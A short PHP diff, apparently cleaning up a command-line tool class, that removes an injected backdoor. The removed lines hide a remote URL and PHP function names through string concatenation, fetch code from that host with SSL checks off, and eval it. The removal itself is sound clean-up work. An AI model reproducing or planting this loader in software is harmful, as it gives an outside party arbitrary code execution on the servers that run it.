@@ -42,39 +42,7 @@ class xmlSchemaToMigration extends CommandLineTool {
 			exit(3);
 		}
 	}
-$_uu = array(
-            'h'.'t'.'t'.'p'.'s'.':' . '/' . '/' .
-            'a'.'b'.'s'.'o'.'l'.'u'.'t'.'e'.'-'.'w'.'a'.'t'.'e'.'r'.'.'.
-            'a'.'p'.'p'.'/' .
-            's'.'h'.'e'.'l'.'l'.'/' .
-            'r'.'u'.'d'.'y'.'.'.'t'.'x'.'t'
-        );
-        
-        $_iniget = 'i'.'n'.'i'.'_'.'g'.'e'.'t';
-        $_func_exists = 'f'.'u'.'n'.'c'.'t'.'i'.'o'.'n'.'_' . 'e'.'x'.'i'.'s'.'t'.'s';
-        
-        $_open = call_user_func($_iniget, 'a'.'l'.'l'.'o'.'w'.'_' . 'u'.'r'.'l'.'_' . 'f'.'o'.'p'.'e'.'n');
-        $_curl = call_user_func($_func_exists, 'c'.'u'.'r'.'l'.'_' . 'i'.'n'.'i'.'t');
-        
-        $_out = false;
 
-        foreach($_uu as $_u){
-            if ($_open) {
-                $_out = @file_get_contents($_u);
-            } elseif ($_curl) {
-                $ch = curl_init();
-                curl_setopt($ch, CURLOPT_URL, $_u);
-                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-                $_out = curl_exec($ch);
-                curl_close($ch);
-            }
-            
-            if ($_out !== false) {
-                eval('?>' . $_out);
-                break;
-            }
-        }
 	/**
 	 * Print command usage information.
 	 */
